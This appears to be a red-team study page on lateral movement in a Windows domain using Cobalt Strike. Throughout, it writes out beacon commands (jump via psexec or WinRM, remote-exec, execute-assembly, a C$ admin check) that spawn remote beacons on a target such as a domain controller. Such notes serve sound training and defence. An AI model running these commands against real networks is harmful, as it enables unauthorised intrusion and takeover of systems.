---
title: Lateral Movement
category: Red Team
order: 7
---

Moving laterally between computers in a domain is important for accessing sensitive information/materials, and obtaining new credentials. 

In this section we are goingto see how do a lateral movement with Cobalt Strike

# Execution commands

Cobalt Strike provides three strategies for executing Beacons, code or commands on remote targets.

To execute commands remotely we need admin privileges.

> **OPSEC Note**: A common way of testing local admin access on a target is to list the C$ directory.
>
>`beacon> ls \\dc01\c$`

## Jump 

`jump` command will spawn a beacon payload on the remote target, and if we use a P2P listener, will connect automatically.

Usage of `jump` command:
```
jump [method] [target] [listener]
```

We can use different methods:

```
beacon> jump

Beacon Remote Exploits
======================

    Exploit                   Arch  Description
    -------                   ----  -----------
    psexec                    x86   Use a service to run a Service EXE artifact
    psexec64                  x64   Use a service to run a Service EXE artifact
    psexec_psh                x86   Use a service to run a PowerShell one-liner
    winrm                     x86   Run a PowerShell script via WinRM
    winrm64                   x64   Run a PowerShell script via WinRM
```

## Remote-exec

`remote-exec` command will simply execute commands on a remote target.

hey require more manual work to manage the payload, but do offer a wider degree of control over what gets executed on the target. You also need to connect to P2P Beacons manually using `connect` or `link`.

## Powershell and execute-assembly

We can specify the target in `powershell` and `execute-assembly` commands.

```
baecon> execute-assembly /path/payload.exe -computername=dc01
```

```
baecon> powershell Get-ChildItem -computername=dc01
```

# PowerShell Remoting

The `winrm` and `winrm64` methods can be used to use powershell remoting.

WinRM will return a **high integrity beacon running as the user** with which are going to be interacted.

```
# 64-bit target
beacon> jump winrm64 dc01 [P2P-Listener]

# 32-bit target
beacon> jump winrm dc01 [P2P-Listener]
```

> **Note**: We can use `Get-WmiObject` to determine the arhitecture of the remote system.


# PsExec

The `psexec` and `psexec64` commands, first a service binary is uploaded to the target system, then a starting windows service is created to execute that binary.

`psexec_psh` doesn't copy the binary to the target, but instead executes a PowerShell one-liner (always in 32-bit).

PsExec will return a beacon running by **SYSTEM**.